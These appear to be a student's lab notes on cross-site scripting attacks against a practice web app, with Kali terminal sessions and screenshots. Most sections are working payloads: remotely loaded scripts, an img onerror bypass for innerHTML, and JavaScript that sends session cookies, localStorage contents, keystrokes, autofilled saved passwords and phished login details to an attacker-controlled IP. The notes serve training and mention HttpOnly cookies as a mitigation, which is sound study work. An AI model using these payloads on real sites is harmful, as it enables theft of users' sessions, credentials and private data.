#### Moving the Payload to an External Resource

- This is just utilized to exploit `XSS` remotely by having the `xss.js` file hosted on a `python3` http server and telling the web server to reach back and pull it.

The exploits we discuss here will be more complicated than an alert box. For this reason, we need to use a payload that can deliver a more complicated exploit. While it is possible to write a single line exploit to inject into the application, it's better to inject an HTMLÂ _script_Â tag, which loads the full JavaScript from our Kali machine, as it will let us write more complicated JavaScript without encoding.

Payloads:
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[31Jul2024 20:23:23]-[/home/kali/SUT]
â””â”€# mkdir xss

â”Œâ”€â”€(rootðŸ’€gobots)-[31Jul2024 20:23:25]-[/home/kali/SUT]
â””â”€# cd xss
echo "alert(1)" > xss.js

python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
Now that the server is started, let's use the payload to exploit the search application with the script below:
```js
<script src="http://192.168.45.155:8000/xss.js"></script>
```

Payload if `innerHTML` is active: 
We are unable to execute because the `innerHTML` method being implemented so we are forced to translate the original payload into a payload that bypasses the method

Original
```html
<script src="http://192.168.45.223:80/xss2.js"></script>
```
Converted utilizing the `img` tag and `onerror`  with chatgpt
```bash
<img src="nonexistent.jpg" onerror="this.onerror=null;document.write('<script src=\'http://192.168.45.223:80/xss2.js\'><\/script>');" />
```

The payload will append a script element to the HTML document and the script tag will load theÂ `xss.js`Â file from our Kali machine. Let's submit the search and exploit the XSS.
![[Pasted image 20240731162755.png]]
After Search
![[Pasted image 20240731162838.png]]
After hitting ok the `script` is rendered on the attacker side it becomes encoded
![[Pasted image 20240731163144.png]]
Once its encoded, render on the victim and now we receive the alert output

![[Pasted image 20240731164447.png]]
We find two entries in the HTTP server logs. The first is from our own Kali IP when we loaded the page ourselves. The second is from the victim's browser.

We'll use the script element payload and the search application for the remainder of the exploits. However, this payload can't be used for any other XSS styles that won't automatically execute JavaScript (for example, client XSS vulnerabilities that useÂ _innerHTML_). Fortunately, there are other methods to get around this restriction.


-------

#### Stealing Session Cookies

- Shows that we are able to exploit the stealing of `Non-HTTPOnly` Session cookies only, the extraction of cookies is mitigated if `HTTPOnly` Cookies Requests are implemented
##### Payloads:
```js
â”Œâ”€â”€(rootðŸ’€gobots)-[31Jul2024 20:53:19]-[/home/kali/SUT/OSWA/xss]
â””â”€# vim xss2.js     

â”Œâ”€â”€(rootðŸ’€gobots)-[31Jul2024 20:53:43]-[/home/kali/SUT/OSWA/xss]
â””â”€# cat xss2.js                  
let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://192.168.45.223/exfil?data=" + encodedCookie)


# set up python server
kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

As shown above, we edited theÂ xss2.jsÂ file to extract and encode the cookie and send a GET request back to our Kali VM with the encoded value. We'll paste the script payload into the Search application and submit the payload.

```js
<script src="http://192.168.45.223:80/xss2.js"></script>
```

This is an example of what the field that we enter the script in looks like
![[Pasted image 20240731180352.png]]
Submitted the script above and it got rendered
![[Pasted image 20240731174739.png]]
python3 server pulling it back
![[Pasted image 20240731174856.png]]
As shown in Listing 3, we edited theÂ xss2.jsÂ file to extract and encode the cookie and send a GET request back to our Kali VM with the encoded value. We'll paste the script payload into the Search application and submit the payload.

![[Pasted image 20240731175651.png]]
Again, we'll "exploit" ourselves but since we don't have cookie set, the log in our HTTP server will be empty.
![[Pasted image 20240731175827.png]]
We can safely ignore the 404 error correctly stating that the "exfil" file doesn't exist because finding this log means that the data was exfiltrated.
Next, let's have the victim run this page. This time, we'll check the box titled "Use Non-HttpOnly Cookie" and then clickÂ _Render_.
![[Pasted image 20240731175929.png]]
The page loads normally, but if we check our HTTP log, we can find a cookie value that was exfiltrated!
![[Pasted image 20240731180109.png]]
Excellent! However, let's uncheck the "Use Non-HttpOnly Cookie" and check "Use HttpOnly Cookie" instead. When we clickÂ _Render_, the page loads normally again, but if we check the log, we don't find a cookie.
![[Pasted image 20240731180151.png]]
![[Pasted image 20240731180215.png]]
When a cookie is set with the HttpOnly flag, JavaScript cannot access it so we can't exfiltrate its value. This is how XSS can be mitigated


---------

#### Stealing Local Secrets - `sessionStorage might wanna review`

Web applications have the ability to store data in a user's browser, a feature typically used to store larger amounts of data. For example, an application that lets us edit documents might store the document locally in the browser as a cache before it's sent to the server to be saved. This ensures that even if the user closes the tab, they don't lose their data. However, local storage might also contain secrets like API keys or personal user information.

There are two types of storage available to us:Â [_sessionStorage_](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage)Â andÂ [_localStorage_](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage). The only difference between the two is the level of persistence. While localStorage will keep the data until explicitly deleted, sessionStorage will keep the data until the tab is closed. The localStorage data can be accessed by using theÂ _window.localStorage_Â property, while sessionStorage can be accessed withÂ _window.sessionStorage_.

To exfiltrate `localStorage`, we'll convert the object into a string, URL encode the string, and useÂ _fetch_Â to send the data back to us.

`localStorage` Payloads:
```js
â”Œâ”€â”€(rootðŸ’€gobots)-[02Aug2024 13:15:17]-[/home/kali/SUT/OSWA/xss]
â””â”€# vim xss3.js   

â”Œâ”€â”€(rootðŸ’€gobots)-[02Aug2024 13:15:49]-[/home/kali/SUT/OSWA/xss]
â””â”€# cat xss3.js   
let data = JSON.stringify(localStorage)

let encodedData = encodeURIComponent(data)

fetch("http://192.168.45.223/exfil?data=" + encodedData)

â”Œâ”€â”€(rootðŸ’€gobots)-[02Aug2024 13:15:57]-[/home/kali/SUT/OSWA/xss]
â””â”€# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
Payload to test against own kali machine 1st
```js
<script src="http://192.168.45.223:80/xss3.js"></script>
```


![[Pasted image 20240802092446.png]]
Upon hitting `search` it gets translated to URL Encoding
![[Pasted image 20240802092609.png]]
Checking the `python3 -m http.server 80` we can see that the payload work
![[Pasted image 20240802092753.png]]
Now since we know that the payload works, check `Data in Local Storage` and hit `Render`
![[Pasted image 20240802093228.png]]
Check the `python3 -m http.server` and can see that the `localStorage` token was sent
![[Pasted image 20240802093357.png]]

---------

#### Keylogging

At times, attacking the application might not be the best course of action. If the user of the site is the larger target, it might be better to target the user instead. Keylogging is one of the best cross-site scripting methods to target users with as it's very difficult for a user to detect, but very effective in exfiltrating secrets.

Keylogging with XSS is limited though. We are able to keylog by creating an event listener for any keystroke, but it can only be set on the current document. That means if the user is on a different tab or in a different application, we won't be able to intercept their keystrokes. However, if the user is typing a private message or attempting to log in on our target site, we can capture those events.

The JavaScript event for keypresses isÂ _keydown_, which will be passed into theÂ _addEventListener_Â function. This function also accepts a callback function to run for each keydown event. Within this function, we'll send the key that was pressed back to our server.

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 19:14:45]-[/home/kali/SUT/OSWA/xss]
â””â”€# vim xss4.js

# Make sure to change the IP address
â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 19:15:09]-[/home/kali/SUT/OSWA/xss]
â””â”€# cat xss4.js 
function logKey(event){
        fetch("http://192.168.45.236/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);

â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 19:15:50]-[/home/kali/SUT/OSWA/xss]
â””â”€# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
In the search option on the website drop the payload and hit search
payload
```bash
<script src="http://192.168.45.236:80/xss4.js"></script>
```

-----

#### Stealing Saved Passwords

As security experts, we often recommend users use a password manager to store their passwords. However, some password managers will conveniently auto-fill any login prompt as soon as it's displayed on screen. We can take advantage of this to steal the credentials a user has stored in their password manager. In most situations, this can be done almost instantly and inconspicuously.

Not all password managers will auto-fill login prompts, but many of the built-in browser password managers will (like the ones found in Chrome). Typically, they search for the combination of a username (or email) input and an input that has theÂ _type_Â attribute set to "password". As attackers, we could create a similar form for a browser to auto-fill, which allows us to steal the credentials and exfiltrate them out.

While we could add the HTML input tags in the script payload, we'll keep everything in theÂ xss.jsÂ file instead to stay organized. In this file, we'll have to create a username and password input. Once the inputs are added to the page, the password manager would automatically fill them with the saved credentials. After some time, we'll send the value of the input back to our Kali machine.

```bASH
â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 20:48:35]-[/home/kali/SUT/OSWA/xss]
â””â”€# vim xss5.js

â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 20:48:46]-[/home/kali/SUT/OSWA/xss]
â””â”€# cat xss5.js 
let body = document.getElementsByTagName("body")[0];

var u = document.createElement("input");
u.type = "text";
u.style.position = "fixed";
//u.style.opacity = "0";

var p = document.createElement("input");
p.type = "password";
p.style.position = "fixed";
//p.style.opacity = "0";

body.append(u)
body.append(p)

setTimeout(function(){ 
    fetch("http://192.168.45.236:80/k?u=" + u.value + "&p=" + p.value)
}, 5000);
                 
â”Œâ”€â”€(rootðŸ’€gobots)-[05Aug2024 20:49:27]-[/home/kali/SUT/OSWA/xss]
â””â”€# python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now rendering from the victim side, 
![[Pasted image 20240805171112.png]]
the credentials pop up in the top left.
![[Pasted image 20240805171158.png]]
after 5 seconds the credentials get populated in the `python3 http.server`
![[Pasted image 20240805171224.png]]

-------

#### Phishing Users  - `should redo before exam`
- Reference original notes - very convoluded 

Script utilized to bypass `innerHTML` script running by utilizing `img` - this script is used to pull and execute the `phishingexercise.js` payload
- the payload entered into the vulnerable field
```js
<img src='x' onerror="const script = document.createElement('script');script.src = 'http://192.168.45.236/phishingexercise.js';script.async = true;document.body.appendChild(script);">
```
My `phishingexercise.js` payload
```html
document.getElementsByTagName("html")[0].innerHTML = '<form action="http://192.168.45.236/login" method="GET"><div class="container"><label for="uname"><b>Username</b></label><input type="text" placeholder="Enter Username" name="uname" required><br><label for="psw"><b>Password</b></label><input type="password" placeholder="Enter Password" name="psw" required><br><button type="submit">Login</button></div></form>';
```